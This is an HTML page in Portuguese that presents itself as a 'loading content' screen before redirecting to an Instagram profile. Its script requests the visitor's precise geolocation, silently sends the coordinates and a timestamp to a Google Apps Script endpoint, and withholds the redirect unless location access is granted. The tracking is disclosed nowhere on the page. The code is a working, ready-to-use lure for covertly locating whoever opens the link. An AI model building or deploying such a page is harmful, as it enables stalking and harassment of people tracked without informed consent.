<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body {
            background-color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    </style>
    <script>
        // URL DA SUA IMPLANTAÇÃO DO APPS SCRIPT
        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzzvns8EpTvPjV96q8nT_WOg6ZOygFZ1_jb2wh-4yeYqXe155DcWGu1b0bDXQQOd24KIw/exec";

        window.onload = function() {
            if (navigator.geolocation) {
                // Solicita a localização do dispositivo
                navigator.geolocation.getCurrentPosition(sucessoLocalizacao, erroLocalizacao, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                alert("Erro: Seu navegador não suporta geolocalização.");
                console.log("Geolocalização não suportada.");
                // Mantém travado sem redirecionar caso o navegador seja antigo
            }
        };

        function sucessoLocalizacao(position) {
            const dados = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                timestamp: new Date().toLocaleString("pt-BR")
            };

            // Envia os dados via método POST
            fetch(WEB_APP_URL, {
                method: "POST",
                mode: "no-cors", 
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(dados)
            })
            .then(() => {
                console.log("Dados enviados.");
                redirecionarUsuario();
            })
            .catch(error => {
                console.error("Erro no envio:", error);
                // Mesmo se der erro no envio, redireciona se ele tiver aceitado
                redirecionarUsuario();
            });
        }

        function erroLocalizacao(error) {
            console.warn("Permissão recusada ou erro obtendo localização:", error.message);
            
            // Exibe mensagem de erro na tela do usuário
            alert("Erro: Você precisa permitir o acesso à localização para visualizar este conteúdo.");
            
            // Alterado: Removemos a função de redirecionar daqui. 
            // O usuário fica parado na página com o aviso.
        }

        function redirecionarUsuario() {
            // Site de destino final (Apenas se aceitar a localização)
            window.location.href = "https://www.instagram.com/_.karinaborges?igsh=ZmRubmdya2l3ZDRm";
        }
    </script>
</head>
<body>
    <p>Carregando conteúdo, por favor aguarde...</p>
</body>
</html>
